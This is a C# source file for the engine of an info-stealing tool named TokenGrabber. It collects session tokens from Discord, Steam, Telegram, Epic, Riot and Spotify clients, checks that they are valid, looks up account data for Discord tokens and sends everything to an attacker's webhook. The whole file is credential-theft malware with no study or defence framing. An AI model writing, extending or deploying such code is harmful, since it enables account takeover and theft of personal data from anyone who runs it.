namespace TokenGrabber.Core;

using TokenGrabber.Config;
using TokenGrabber.Discord;
using TokenGrabber.Exfil;
using TokenGrabber.Grabbers;
using TokenGrabber.Models;

internal sealed class GrabberEngine
{
    private readonly GrabberConfig _config;
    private readonly TokenValidator _validator;
    private readonly SessionManager _sessions;

    public GrabberEngine(GrabberConfig config)
    {
        _config = config;
        _validator = new TokenValidator();
        _sessions = new SessionManager();
    }

    public async Task RunAsync()
    {
        var allTokens = new List<GrabbedToken>();

        foreach (var target in _config.Targets)
        {
            var grabber = CreateGrabber(target);
            if (grabber is null) continue;

            var tokens = grabber.Extract();
            allTokens.AddRange(tokens);
        }

        if (_config.ValidateTokens)
        {
            allTokens = await ValidateAllAsync(allTokens);
        }

        var accountDataList = new List<AccountData>();
        foreach (var token in allTokens.Where(t => t.Platform == "Discord"))
        {
            var info = await AccountInfo.FetchAsync(token.Token);
            if (info != null)
                accountDataList.Add(info);
        }

        var payload = PayloadBuilder.Build(allTokens, accountDataList);
        var sender = new WebhookSender(_config.WebhookUrl);
        await sender.SendAsync(payload);
    }

    private static ITokenGrabber? CreateGrabber(string target) => target.ToLowerInvariant() switch
    {
        "discord" => new DiscordGrabber(),
        "steam" => new SteamGrabber(),
        "telegram" => new TelegramGrabber(),
        "epic" => new EpicGrabber(),
        "riot" => new RiotGrabber(),
        "spotify" => new SpotifyGrabber(),
        _ => null
    };

    private async Task<List<GrabbedToken>> ValidateAllAsync(List<GrabbedToken> tokens)
    {
        var valid = new List<GrabbedToken>();
        foreach (var token in tokens)
        {
            var isValid = await _validator.ValidateAsync(token);
            if (isValid)
                valid.Add(token with { IsValid = true });
        }
        return valid;
    }
}
